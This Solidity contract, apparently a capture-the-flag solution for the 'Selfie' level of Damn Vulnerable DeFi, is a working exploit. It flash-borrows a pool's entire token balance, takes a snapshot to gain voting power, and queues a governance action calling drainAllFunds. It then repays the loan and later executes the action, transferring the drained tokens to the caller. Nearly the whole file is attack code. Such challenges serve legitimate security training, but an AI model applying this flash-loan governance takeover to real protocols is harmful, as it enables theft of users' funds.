// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "hardhat/console.sol";

/**
 * @title SelfieAttacker
 * @author Jonatas Campos Martins
 * @dev The main idea is to create an action passing a data that get all tokens from the pool and then * send the tokens to the attacker
 */
contract SelfieAttacker {
    ERC20Snapshot private token;
    SelfiePool private selfiePool;
    SimpleGovernance private simpleGovernance;
    uint256 private actionId;

    constructor(
        address _token,
        address _selfiePool,
        address _simpleGovernance
    ) {
        token = ERC20Snapshot(_token);
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
    }

    function queuAttack() external {
        uint256 balancePool = token.balanceOf(address(selfiePool));
        selfiePool.flashLoan(balancePool);
    }

    /**
     * @dev this function get the flashloan and queue an action in the governance contract
     */
    function receiveTokens(address _token, uint256 _amount) external {
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        DamnValuableTokenSnapshot tokenSnapshot = DamnValuableTokenSnapshot(
            _token
        );
        tokenSnapshot.snapshot();
        actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);
        token.transfer(address(selfiePool), _amount);
    }

    /**
     * @dev after delay execute the attack getting all the tokens from pool
     */
    function executeAttack() external {
        simpleGovernance.executeAction(actionId);
        uint256 total = token.balanceOf(address(this));
        token.transfer(msg.sender, total);
    }
}
